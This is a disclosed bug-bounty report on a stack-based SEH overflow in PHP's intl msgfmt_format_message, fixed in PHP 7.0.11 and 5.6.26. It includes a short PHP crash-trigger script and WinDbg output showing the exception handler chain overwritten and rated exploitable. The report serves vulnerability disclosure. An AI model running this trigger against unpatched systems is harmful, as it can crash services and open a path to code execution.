# SEH buffer overflow msgfmt_format_message

## Report Details
- **Report ID**: 170138
- **URL**: https://hackerone.com/reports/170138
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-09-17T23:22:50.652Z
- **Disclosed**: 2019-10-13T18:10:00.008Z

## Reporter
- **Username**: fms
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Upstream bug
---------------
https://bugs.php.net/bug.php?id=73007

Fixed in PHP 7.0.11 and PHP 5.6.26
---------------
http://php.net/ChangeLog-5.php#5.6.26
http://php.net/ChangeLog-7.php#7.0.11

Patch
-------
```
http://git.php.net/?p=php-src.git;a=commit;h=20fa323d53257a776bd7551ce7bdb2261cfe5420
```

Description:
------------
Big locale string causes stack based overflow inside libicu. PHP could prevent this issue limiting length of the locale to a valid value.

Source code:
https://github.com/php/php-src/blob/PHP-7.0.10/ext/intl/msgformat/msgformat_format.c#L98

```
PHP_FUNCTION( msgfmt_format_message )
{
    zval       *args;
    UChar      *spattern = NULL;
    int         spattern_len = 0;
    char       *pattern = NULL;
    size_t      pattern_len = 0;
    const char *slocale = NULL;
    size_t      slocale_len = 0;
    MessageFormatter_object mf;
    MessageFormatter_object *mfo = &mf;

    /* Parse parameters. */
    if( zend_parse_method_parameters( ZEND_NUM_ARGS(), getThis(), "ssa",
          &slocale, &slocale_len, &pattern, &pattern_len, &args ) == FAILURE )
    {
        intl_error_set( NULL, U_ILLEGAL_ARGUMENT_ERROR,
            "msgfmt_format_message: unable to parse input params", 0 );

        RETURN_FALSE;
    }

    memset(mfo, 0, sizeof(*mfo));
    msgformat_data_init(&mfo->mf_data);

    if(pattern && pattern_len) {
        intl_convert_utf8_to_utf16(&spattern, &spattern_len, pattern, pattern_len, &INTL_DATA_ERROR_CODE(mfo));
```
Test script:
---------------
```
<?php

ini_set('memory_limit', -1);

$v1 = str_repeat("ABCE", 503566756/3);
$v2 = "test";
$v3 = [];

MessageFormatter::formatMessage($v1, $v2, $v3);
// msgfmt_format_message($v1, $v2, $v3);
```


Actual result:
--------------
```
Microsoft (R) Windows Debugger Version 6.11.0001.404 AMD64
Copyright (c) Microsoft Corporation. All rights reserved.

CommandLine: C:\tools\php7010\php.exe -n -dextension=ext\php_bz2.dll  -dextension=ext\php_com_dotnet.dll  -dextension=ext\php_curl.dll  -dextension=ext\php_enchant.dll  -dextension=ext\php_exif.dll  -dextension=ext\php_fileinfo.dll  -dextension=ext\php_ftp.dll  -dextension=ext\php_gd2.dll  -dextension=ext\php_gettext.dll  -dextension=ext\php_gmp.dll  -dextension=ext\php_imap.dll  -dextension=ext\php_intl.dll  -dextension=ext\php_ldap.dll  -dextension=ext\php_mbstring.dll  -dextension=ext\php_mysqli.dll   -dextension=ext\php_odbc.dll  -dextension=ext\php_openssl.dll   -dextension=ext\php_pdo_mysql.dll   -dextension=ext\php_pdo_odbc.dll  -dextension=ext\php_pdo_pgsql.dll  -dextension=ext\php_pdo_sqlite.dll  -dextension=ext\php_pgsql.dll  -dextension=ext\php_phpdbg_webhelper.dll  -dextension=ext\php_shmop.dll  -dextension=ext\php_soap.dll  -dextension=ext\php_sockets.dll  -dextension=ext\php_sqlite3.dll  -dextension=ext\php_sysvshm.dll  -dextension=ext\php_tidy.dll  -dextension=ext\php_xmlrpc.dll  -dextension=ext\php_xsl.dll  -dextension=ext\php_yaml.dll poc.php

...

(e5c.d80): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\tools\php7010\icuuc57.dll
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\tools\php7010\icuuc57.dll - 
Processing initial command 'r;!exploitable -v'
icuuc57!icu_57::Locale::Locale+0x27c:
4a85613c 8801            mov     byte ptr [ecx],al          ds:002b:05360000=00
0:000:x86> r;!exploitable -v
eax=0535e545 ebx=00000000 ecx=05360000 edx=10201a74 esi=0535e59d edi=00000000
eip=4a85613c esp=0535e55c ebp=0535e64c iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
icuuc57!icu_57::Locale::Locale+0x27c:
4a85613c 8801            mov     byte ptr [ecx],al          ds:002b:05360000=00

!exploitable 1.6.0.0
HostMachine\HostUser
Executing Processor Architecture is x86
Debuggee is in User Mode
Debuggee is a live user mode debugging session on the local machine
Event Type: Exception
Exception Faulting Address: 0x5360000
First Chance Exception Type: STATUS_ACCESS_VIOLATION (0xC0000005)
Exception Sub-Type: Write Access Violation

Exception Hash (Major/Minor): 0xbf0ac847.0x9fec2922

 Hash Usage : Stack Trace:
Major+Minor : icuuc57!icu_57::Locale::Locale+0x27c
Major+Minor : Unknown
Major+Minor : Unknown
Major+Minor : Unknown
Major+Minor : Unknown
Minor       : Unknown
Minor       : Unknown
Minor       : Unknown
Minor       : Unknown
Minor       : Unknown
Minor       : Unknown
Minor       : Unknown
Minor       : Unknown
...
Minor       : Unknown
Minor       : Unknown
Minor       : Unknown
Minor       : Unknown
Minor       : Unknown
Instruction Address: 0x000000004a85613c

Description: Exception Handler Chain Corrupted
Short Description: ExceptionHandlerCorrupted
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - Exception Handler Chain Corrupted starting at icuuc57!icu_57::Locale::Locale+0x000000000000027c (Hash=0xbf0ac847.0x9fec2922)

Corruption of the exception handler chain is considered exploitable
0:000:x86> !exchain
000000000535e640: 0000000043424145
Invalid exception stack at 0000000043424145     // Exception handler overwrote to 'ABCE'
0:000:x86> k
ChildEBP RetAddr  
WARNING: Stack unwind information not available. Following frames may be wrong.
0535e64c 43424145 icuuc57!icu_57::Locale::Locale+0x27c
0535e650 43424145 0x43424145
0535e654 43424145 0x43424145
0535e658 43424145 0x43424145
0535e65c 43424145 0x43424145
0535e660 43424145 0x43424145
0535e664 43424145 0x43424145
0535e668 43424145 0x43424145
0535e66c 43424145 0x43424145
0535e670 43424145 0x43424145
0535e674 43424145 0x43424145
0535e678 43424145 0x43424145
0535e67c 43424145 0x43424145
0535e680 43424145 0x43424145
0535e684 43424145 0x43424145
0535e688 43424145 0x43424145
0535e68c 43424145 0x43424145
0535e690 43424145 0x43424145
0535e694 43424145 0x43424145
0535e698 43424145 0x43424145
```

## Attachments
No attachments
